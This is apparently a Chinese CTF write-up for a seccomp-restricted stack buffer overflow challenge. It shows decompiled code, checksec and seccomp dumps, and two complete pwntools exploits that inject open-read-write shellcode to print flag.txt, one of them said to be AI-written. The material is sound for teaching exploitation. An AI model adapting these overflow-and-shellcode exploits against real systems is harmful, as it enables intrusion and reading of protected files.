# ret2shellcode-orw

反编译：

```c
ssize_t vuln()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  _BYTE buf[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("No /bin/sh for you this time!");
  printf("Here is your gift: %p\n", buf);
  printf("Show me your shellcode: ");
  sandbox((__int64)"Show me your shellcode: ", (__int64)buf, v0, v1, v2, v3);
  return read(0, buf, 0x200u);
}
```

checksec 输出：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

seccomp-tools dump 输出：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

和 [ret2shellcode](./ret2shellcode.md) 类似，在栈上写 shellcode，不过这次限制了能用的 syscall，因此用 pwntools 的 shellcraft.amd64.linux.cat2 来完成 open-read-write：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./vuln")
elf = ELF("./vuln")

p.recvuntil(b"Here is your gift:")
buf_addr = int(p.recvline().decode(), 16)
log.info(f"buf addr: 0x{buf_addr:x}")
shellcode = shellcraft.amd64.linux.cat2("flag.txt", fd=1)
shellcode_addr = buf_addr + 0x110
payload = b"A" * 0x108 + p64(shellcode_addr) + asm(shellcode)
print(shellcode)
print(payload)
p.recvuntil(b"shellcode: ")
p.send(payload)
p.interactive()
```

AI 完成的攻击代码，没有用 cat2，而是手动进行 open-read-write 三个 syscall：

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

import sys
LOCAL = '--remote' not in sys.argv

if LOCAL:
    p = process('./vuln')
else:
    p = remote('localhost', 9999)

# Receive leaked buffer address
p.recvuntil(b'Here is your gift: ')
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked buffer: {hex(buffer_addr)}")

p.recvuntil(b'Show me your shellcode: ')

# ORW shellcode: open("flag.txt", O_RDONLY) -> read(fd, buf, 0x100) -> write(1, buf, 0x100)
shellcode = asm('''
    /* push "flag.txt" onto stack */
    xor rax, rax
    push rax
    mov rax, 0x7478742e67616c66
    push rax
    mov rdi, rsp

    /* open("flag.txt", O_RDONLY) */
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* read(fd, rsp+0x100, 0x100) */
    mov rdi, rax
    lea rsi, [rsp + 0x100]
    mov rdx, 0x100
    xor rax, rax
    syscall

    /* write(1, rsp+0x100, 0x100) */
    mov rdi, 1
    lea rsi, [rsp + 0x100]
    mov rdx, 0x100
    mov rax, 1
    syscall
''')

log.info(f"Shellcode length: {len(shellcode)}")

# Stack layout (vuln function):
#   [buffer         ] rbp-0x100  256 bytes
#   [saved rbp      ] rbp         8 bytes
#   [return address ] rbp+8       8 bytes
#
# Payload: [NOP sled][shellcode][padding to ret addr][buffer_addr]

payload  = b'\x90' * 32                # NOP sled
payload += shellcode                    # shellcode
payload += b'\x90' * (264 - len(payload))  # fill to return address
payload += p64(buffer_addr)            # return to NOP sled

p.send(payload)

# Receive the flag
p.interactive()
```
